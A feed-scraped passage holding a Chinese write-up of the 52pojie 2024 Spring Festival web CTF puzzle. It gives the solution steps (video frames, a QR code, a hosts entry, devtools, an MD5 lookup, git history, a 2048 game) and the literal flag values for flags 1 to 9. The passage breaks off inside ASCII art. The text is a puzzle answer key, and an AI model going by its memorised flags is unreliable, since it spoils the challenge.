<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140199&amp;idx=1&amp;sn=e27d9a00557d0f9c49a0c83bf2e455af&amp;chksm=bd50a0338a272925dd0f4fee3e76e24437ba4c948d6c1360805a281024baa0316527535198fe&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span></span> <span>2024-03-07 10:15</span> <span style="display: inline-block;">日本</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Thu, 07 Mar 2024 10:14:47 +0800</pubDate>
<pubDate>Thu, 07 Mar 2024 10:14:47 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，先送20个账号注册码或300论坛币，明天下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140197&amp;idx=1&amp;sn=ec1a6e9254da837582d966aae3b09690&amp;chksm=bd50a0318a27292791850cb4b1d614c954cdc106af4840e98671bb8782a911e6218e6788245b&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140197&amp;idx=1&amp;sn=ec1a6e9254da837582d966aae3b09690&amp;chksm=bd50a0318a27292791850cb4b1d614c954cdc106af4840e98671bb8782a911e6218e6788245b&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span></span> <span>2024-03-06 10:46</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Wed, 06 Mar 2024 10:45:47 +0800</pubDate>
<pubDate>Wed, 06 Mar 2024 10:45:47 +0800</pubDate>
</item>
<item>
<title>【2024春节】解题领红包之web题writeup</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140195&amp;idx=1&amp;sn=dfd66f351cc9e8608004f25b94b679cd&amp;chksm=bd50a0378a272921f453cc49095c7c68399b645732d707b4a231a622f669ae2e217eca5ef311&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140195&amp;idx=1&amp;sn=dfd66f351cc9e8608004f25b94b679cd&amp;chksm=bd50a0378a272921f453cc49095c7c68399b645732d707b4a231a622f669ae2e217eca5ef311&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-05 15:20</span> <span style="display: inline-block;">北京</span>
</p>

<p>一年一度的吾爱春节ctf开赛了。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=12a64007&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJePA1uQ5J5Kf1xSV460MbUqNdv8CHxJH3Qc9nhDhPD6NtZsKV1fk5QQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：1254qwer</span></strong></p><p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span><br /></span></strong></p><p><span style="text-decoration: line-through;">一年一度的吾爱春节ctf开赛了</span></p><p>原视频：吾爱破解【2024年春节】解题领红包之Web题https://www.bilibili.com/video/BV1ap421R7VS</p><h2>flag1</h2><p>来源于视频<code style="font-family: SFMono-Regular, Consolas, ;">00:02-00:03</code>几帧，下图圈上的位置白点中间的字就是flag1。</p><p>推荐把视频下载下来，使用播放器/剪辑软件逐帧看会更明显。</p><p><img border="0" class="rich_pages wxw-img" height="436" src="https://https://wechat2rss.xlab.app/img-proxy/?k=265408ec&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJHOFmMAlou4p33GS2RicODyyHhiadPdg33iayiaUwbUOJSxK0icmCdrHhWwg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="776" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag1{52pj2024}</code></p><h2>flag2</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:04-00:07</code>里有四部分被切开的二维码</p><p><img border="0" class="rich_pages wxw-img" height="561" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8ef3c316&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ15ZLySH1vsXuscLDxnAP6lNXmVHeeptvKfCrIPBXiaPTicsfuYmFKopA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="463" /></p><p><br /></p><p>全部截图出来，放进PS，使用多边形套索工具圈出图片里的二维码，然后拼到一起。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6676a34a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ6E2tOHic06fp1aOGQqH0WexfuGB8NEibGibNicfFOoXdS1rxrOBDzoe3wA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1066" /></p><p><br /></p><p>这里发现，二维码定位点是白色，因此需要做一次反色处理</p><p>把4个残缺的二维码合并到同一图层，然后点击上方图像-调整-反相</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bbd3a168&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJPkUTSsH90meZ4hDEyRBnxocCV6dlEpwy5c4A36GFLphUGPMBtxMv3g%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="508" /></p><p><br /></p><p>这样就能拿到正常的二维码</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=285af1d2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJM0HNA2xGRworIfkpibyIHXcQRA6ZNicOA3J8QCicjib3xIm2CIORSM9YaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1066" /></p><p><br /></p><p>直接扫码，得到一个网址：https://2024challenge.52pojie.cn/</p><p>直接尝试打开，发现无法打开。</p><p>想到去年的思路，同属.52pojie.cn，应该和主站在同一台服务器。</p><p>直接<code style="font-family: SFMono-Regular, Consolas, ;">nslookup 52pojie.cn</code>得到主站ip，然后去系统hosts内添加一条</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">124.232.185.97 2024challenge.52pojie.cn</code></pre><p>就可以打开了。</p><p>先打开浏览器f12，来到网络面板，再输入网址尝试进入。</p><p>flag2就在第一个请求的响应头内的<code style="font-family: SFMono-Regular, Consolas, ;">X-Flag2</code>。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fe30eeb6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJRias7JnuGia9OO7NH8Fh3Y6cEznwoU5qaZK8gPmzAWTOIsjp2QeuFiaoA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag2{xHOpRP}</code></p><h2>flag3</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:00-00:01</code>是横向移动的雪花，中间有串暂停就看不见的文字，就是flag3.</p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag3{GRsgk2}</code></p><p>这段文字自身横向移动方向和背景相反，从而能被人眼识别到。</p><p>类似实现的还有这类视频：</p><p>https://www.bilibili.com/video/BV1qF411u7sc/</p><p>https://www.bilibili.com/video/BV1GM4y1b7JB/</p><h2>flag4</h2><p>继续看上一步的网络面板，可以看到请求了一个名为<code style="font-family: SFMono-Regular, Consolas, ;">flag4_flag10.png</code>，直接预览就能看到flag4</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5f0a5e06&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJXH5kFztGlj9CH9yIrNJptcKf1jbCqlcE0lf5luK4p5jjLk3P74aDOw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag4{YvJZNS}</code></p><p>可以在这里先把图片保存到本地，为寻找flag10做准备。</p><blockquote><p style="margin-bottom: 15px;">这里记录个大坑：最好使用curl等工具下载该图片到本地，最新版Edge自带了个“Edge Image Viewer”，其中的“另存为”功能会导致图片丢失信息，无法找到flag10</p></blockquote><h2>flag5</h2><p>浏览器f12切到元素面板，发现了个<code style="font-family: SFMono-Regular, Consolas, ;">&lt;pre&gt;</code>元素，上方注释了flag5和flag9</p><p>鼠标选中该元素，取消勾选这三个就能在网页上方看到文字（这三个主要作用为将其内部文字颜色设为白色并且使用户无法选中该段文字）</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=b115929e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJAPIXNKwrbF4bmMwKCkl64cmPN4uYuGR5kAbIjhFnKzyEWnyq6EgpqA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="263" /></p><p><br /></p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8f5855e7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ8Z61V6LjCWe9XhyNWXjlXEOKyAndG2kStiaBNv4okpwmrXXia2sklZKA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>粗略一看，有flag四个字母零散放置。</p><p>打开文本编辑器，找到l的位置，换行，随后在a的位置换行</p><p>可以发现刚好字符数量能对齐，那就按照等字符数量在相同的位置换行（这里一定要使用等宽字体）</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1223147f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJJtY1dib1bsQv6tadL7vGsGiaCJ9mp5C6a9k76Hicb6n1ILfLYXOstbHCA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以发现第一列竖着看刚好是flag5，右侧是flag9的字符画。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag5{P3prqF}</code></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag9{KHTALK}</code></p><h2>flag6</h2><p>直接点击网页内flag6链接打开，检查元素，发现下方有js代码</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=13e41709&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJHQr6oj25icuaG5GHkeBlBz6iaoy0RJb8WTvbxo9Z31cicb86NDib2pbSSw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="989" /></p><p><br /></p><p>看下方js逻辑，大致为寻找md5是<code style="font-family: SFMono-Regular, Consolas, ;">1c450bbafad15ad87c32831fa1a616fc</code>的字符串<code style="font-family: SFMono-Regular, Consolas, ;">$str</code>，然后拼接为形如<code style="font-family: SFMono-Regular, Consolas, ;">flag6{$str}</code>的字符输出。</p><p>打开cmd5.com，搜一下这串md5就能推出结果。</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=38101ca3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJwKOJLlC6EsuszCCGWVwoC6RqolEEuwWmumtZ39g1icOr5Mrk4Fh9x2w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1002" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag6{20240217}</code></p><p>（或者，直接点击上方按钮，然后像论坛每次开放注册一样，等几分钟？）</p><p>（实测2.17号18:20跑87s可以出结果，不到2分钟）.</p><h2>flag7</h2><p>视频<code style="font-family: SFMono-Regular, Consolas, ;">00:21</code>下方出现github仓库网址</p><p>https://github.com/ganlvtech/52pojie-2024-challenge</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e51fb269&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJxDeXq3STQaXOBx54490MKc5iaSBxQP0m5a3sJ7qG1O3km0jCJ6aIfMg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>打开提交历史，查看diff就能找到flag7</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fa2bbbf2&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJ9LbFylFQ6wQibyz3y1VpoRt6dqwx6cjOAL3AfQibWDXk0hkHTS9sJXibA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag7{Djl9NQ}</code></p><h2>flag8</h2><p>回到https://2024challenge.52pojie.cn/</p><p>直接进入flag8&amp;flagB页面，可以看到是个2048游戏，flag8需要总计积分（金币）达到10000，不算太多，可以直接玩几局拿到（我大概玩了7分钟）</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=15359603&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJe20PccrO5v5NrjtEEbZ0cjVruNDtYc8nicjTNmUjaDpqQwabQ5LZuxg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="821" /></p><p><br /></p><p>直接购买并使用即可拿到</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=70cff6ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJN8EOySdJys5ia8eMBN4iaQukXLiajhDpg8ATx5pkrJtIMY8anHw5hKfug%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="498" /></p><p><br /></p><p><code style="font-family: SFMono-Regular, Consolas, ;">flag8{OaOjIK}</code></p><h2>flag9</h2><p>和flag5同时拿到，获取流程见flag5</p><p>这里给出字符画原文</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">f.<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__.............<br />l..__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>............<br />a..<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\\\<span style="font-weight: 700;">__/\\\\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_/\\\\\\\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_/\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span>/\\\\\\\\\\\\\\\<span style="font-weight: 700;">____</span>_</span>/\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">___...........<br />g...__</span><span style="font-weight: 700;">____</span>/\\\///<span style="font-weight: 700;">__\////\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>/\\\///////\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span>_</span>/\\\//<span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\_</span>\///////\\\/////<span style="font-weight: 700;">____</span>/\\\\\\\\\\\\\<span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__/\\\//__</span><span style="font-style: italic;">_/\\\\\<span style="font-weight: 700;">____</span>_</span>..........<br />5....<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\\\\\\<span style="font-weight: 700;">____</span>/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\//\\\__</span><span style="font-weight: 700;">___/\\\///__</span>\/\\\<span style="font-weight: 700;">__/\\\//__</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\/////////\\\_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">__/\\\//__</span><span style="font-weight: 700;">___\////\\\__</span><span style="font-weight: 700;">__.........<br />{.....__</span>/\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">___/\\\\\\\\\__</span><span style="font-weight: 700;">___/\\\////\\\__</span>\//\\\<span style="font-weight: 700;">____</span>_</span>/\\\\\<span style="font-weight: 700;">____</span>\//\\\<span style="font-weight: 700;">____</span>\/\\\\\\//\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\/\\\\\\\\\\\\\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\\\\//\\\_</span>__</span><span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\<span style="font-weight: 700;">____</span>_</span>........<br />P......<span style="font-style: italic;">_\////\\\//<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">__\////////\\\__</span>_</span>\//\\\\\\\\\<span style="font-weight: 700;">__<span style="font-style: italic;">_\///\\\\\\\\/\\\_</span><span style="font-style: italic;">_/\\\\\\_</span>__</span><span style="font-weight: 700;">__\/\\\//<span style="font-style: italic;">_\//\\\_</span>__</span><span style="font-style: italic;">_\/\\\/////////\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>_</span>\/\\\\\\\\\\\\\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\//<span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__\//\\\\\\_.......<br />3.......__</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">___\/\\\__</span><span style="font-weight: 700;">____</span>/\\\\\\\\\\<span style="font-weight: 700;">___\///////\\\__</span><span style="font-weight: 700;">___\////////\/\\\_\/////\\\__</span><span style="font-weight: 700;">__\/\\\__</span><span style="font-weight: 700;">__\//\\\__</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\/////////\\\_</span>\/\\\__</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\///__</span>......<br />p........<span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_/\\\/////\\\<span style="font-weight: 700;">___/\\__</span><span style="font-weight: 700;">___\\\__</span>_</span>/\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__/\\\__</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">__\//\\\__</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">__<span style="font-style: italic;">_\/\\\_</span>__</span><span style="font-weight: 700;">____</span>\/\\\<span style="font-style: italic;">_\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span><span style="font-weight: 700;">____</span>_</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-style: italic;">_\//\\\<span style="font-weight: 700;">____</span>\//\\\<span style="font-weight: 700;">____</span>.....<br />r.........<span style="font-weight: 700;">____</span>\/\\\<span style="font-weight: 700;">____</span><span style="font-weight: 700;">___/\\\\\\\\\_\//\\\\\\\\/\\_\//\\\\\\\\__</span>_</span>\//\\\\\\\\\\\/<span style="font-weight: 700;">____</span><span style="font-weight: 